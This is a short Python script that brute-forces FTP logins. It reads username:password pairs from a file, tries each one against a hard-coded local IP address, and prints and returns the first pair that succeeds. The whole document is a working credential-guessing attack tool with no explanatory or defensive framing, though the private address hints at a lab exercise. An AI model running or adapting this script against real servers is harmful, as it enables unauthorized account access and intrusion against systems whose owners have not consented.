#!usr/bin/python

import ftplib

def bruteLogin(host,passwdFile):
    try:
        pF = open(passwdFile,"r")
    except:
        print("[!!] File doesn\'t exist!")
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\n')
        print("Attempting brute force with username: "+ userName + " and password: " + passWord)
        try:
            ftp = ftplib.FTP(host)
            login = ftp.login(userName,passWord)
            print("[+] Login succeeded with: " + userName + "/" + passWord)
            ftp.quit()
            return(userName,passWord)
        except:
            pass
    print("[-] Username/password not in list")

host = "192.168.1.7"
passwdFile = "passwords_users.txt"
bruteLogin(host,passwdFile)
